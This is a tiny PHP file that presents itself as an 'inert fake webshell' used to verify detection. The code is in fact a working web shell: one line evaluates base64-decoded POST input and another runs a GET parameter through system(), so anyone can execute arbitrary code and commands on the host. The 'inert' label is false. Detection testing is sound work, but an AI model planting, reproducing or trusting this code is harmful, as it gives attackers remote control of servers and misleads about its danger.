<?php
// LAB TEST SAMPLE - inert fake webshell used to verify detection
if (isset($_POST["x"])) { eval(base64_decode($_POST["x"])); }
if (isset($_GET["c"])) { system($_GET["c"]); }
